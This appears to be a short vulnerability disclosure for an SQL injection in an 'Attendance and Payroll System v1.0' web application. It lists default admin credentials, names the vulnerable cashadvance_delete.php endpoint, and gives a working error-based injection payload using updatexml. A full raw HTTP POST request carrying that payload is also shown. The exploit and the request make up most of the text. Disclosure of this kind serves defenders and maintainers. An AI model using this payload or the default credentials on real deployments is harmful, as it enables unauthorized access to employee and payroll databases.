# Attendance and Payroll System v1.0 - SQL injection

username:nurhodelta password:password ----> {ip}apsystem/admin/index.php

\admin\cashadvance_delete.php has SQL injection

SQL injection because id can be closed

Payload: id=2' and updatexml(1,concat(0x7e,(select database()),0x7e),2)--+&delete=

![image](https://user-images.githubusercontent.com/54017627/159221983-d811e070-311f-4035-b378-4d6ee33e1edf.png)

```sql
POST /apsystem/admin/cashadvance_delete.php HTTP/1.1
Host: 192.168.1.17
Content-Length: 73
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.1.17
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.1.17/apsystem/admin/cashadvance.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=2nud4pa7qt6oo5odl3120a4bta
Connection: close

id=3' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+&delete=
```

![image](https://user-images.githubusercontent.com/54017627/159222215-a529e5fa-4b1b-4f8c-93f1-dcdec03b1aca.png)

![image](https://user-images.githubusercontent.com/54017627/159223005-0a3bebaa-d4f5-459a-bd52-b5f47fe83a1a.png)


